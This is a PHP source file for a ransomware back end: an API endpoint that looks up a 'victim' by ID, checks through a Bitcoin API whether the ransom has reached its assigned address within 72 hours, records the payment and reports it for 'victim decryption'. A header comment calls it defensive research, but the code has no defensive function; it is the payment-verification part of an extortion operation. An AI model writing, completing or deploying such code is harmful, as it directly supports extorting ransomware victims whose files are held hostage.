<?php
/**
 * Payment Verification API Endpoint
 * Verifies Bitcoin payment status for victim decryption
 * For defensive cybersecurity research purposes only
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

require_once '../database.php';
require_once '../bitcoin_api.php';

try {
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        throw new Exception("Only POST method allowed");
    }
    
    $victim_id = $_POST['victim_id'] ?? '';
    
    if (empty($victim_id)) {
        throw new Exception("Missing victim_id parameter");
    }
    
    $db = new Database();
    $bitcoin_api = new BitcoinAPI();
    
    // Get victim payment information
    $payment = $db->getPaymentByVictimId($victim_id);
    
    if (!$payment) {
        echo json_encode([
            'payment_verified' => false,
            'status' => 'No payment record found',
            'error_code' => 'PAYMENT_NOT_FOUND'
        ]);
        exit;
    }
    
    // Check if payment is already verified
    if ($payment['payment_received']) {
        echo json_encode([
            'payment_verified' => true,
            'status' => 'Payment previously verified',
            'transaction_id' => $payment['transaction_id'],
            'received_at' => $payment['received_at'],
            'amount_btc' => $payment['amount_btc'],
            'verification_timestamp' => time()
        ]);
        exit;
    }
    
    // Verify payment with Bitcoin APIs
    $verification = $bitcoin_api->verifyPayment(
        $payment['bitcoin_address'],
        $payment['amount_btc'],
        72 // 72 hour window
    );
    
    if ($verification['verified']) {
        // Payment is verified - update database
        $transaction_id = $verification['transactions'][0]['txid'] ?? 'unknown_' . time();
        
        $db->markPaymentReceived($victim_id, $transaction_id);
        
        // Log successful verification
        error_log("Payment verified for victim: $victim_id, Transaction: $transaction_id");
        
        echo json_encode([
            'payment_verified' => true,
            'status' => 'Payment successfully verified',
            'transaction_id' => $transaction_id,
            'amount_received' => $verification['total_received'],
            'amount_expected' => $verification['expected_amount'],
            'confirmations' => $verification['transactions'][0]['confirmations'] ?? 0,
            'verification_timestamp' => time()
        ]);
        
    } else {
        // Payment not yet verified
        echo json_encode([
            'payment_verified' => false,
            'status' => 'Payment not yet received or confirmed',
            'bitcoin_address' => $payment['bitcoin_address'],
            'amount_expected' => $payment['amount_btc'],
            'amount_received' => $verification['total_received'] ?? 0,
            'error_code' => 'PAYMENT_PENDING',
            'verification_timestamp' => time()
        ]);
    }
    
} catch (Exception $e) {
    error_log("Payment verification error: " . $e->getMessage());
    
    echo json_encode([
        'payment_verified' => false,
        'status' => 'Verification system error',
        'error' => $e->getMessage(),
        'error_code' => 'VERIFICATION_ERROR',
        'timestamp' => time()
    ]);
}
?>